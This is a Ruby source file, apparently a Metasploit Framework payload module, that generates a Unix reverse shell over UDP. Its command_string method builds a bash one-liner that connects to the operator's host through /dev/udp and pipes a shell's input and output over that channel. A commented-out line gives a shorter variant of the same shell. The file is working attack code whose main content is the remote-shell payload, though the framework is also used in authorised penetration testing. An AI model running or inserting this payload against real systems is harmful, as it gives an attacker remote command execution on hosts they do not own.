##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'          => 'Unix Command Shell, Reverse UDP (/dev/udp)',
     'Description'   => %q{
          Creates an interactive shell via bash's builtin /dev/udp.

          This will not work on circa 2009 and older Debian-based Linux
          distributions (including Ubuntu) because they compile bash
          without the /dev/udp feature.
          },
     'Author'        => [
       'hdm',   # Reverse bash TCP
       'bcoles' # Reverse bash UDP
     ],
     'License'       => MSF_LICENSE,
     'Platform'      => 'unix',
     'Arch'          => ARCH_CMD,
     'Handler'       => Msf::Handler::ReverseUdp,
     'Session'       => Msf::Sessions::CommandShell,
     'PayloadType'   => 'cmd_bash',
     'RequiredCmd'   => 'bash-udp',
     'Payload'       =>
       {
         'Offsets' => { },
         'Payload' => ''
       }
    ))
    register_advanced_options(
      [
        OptString.new('BashPath', [true, 'The path to the Bash executable', 'bash']),
        OptString.new('ShellPath', [true, 'The path to the shell to execute', 'sh'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    fd = rand(200) + 20
    return "#{datastore['BashPath']} -c '0<&#{fd}-;exec #{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']};echo>&#{fd};#{datastore['ShellPath']} <&#{fd} >&#{fd} 2>&#{fd}'";

    # no semicolons
    #return "sh -i >& /dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']} 0>&1"
  end
end
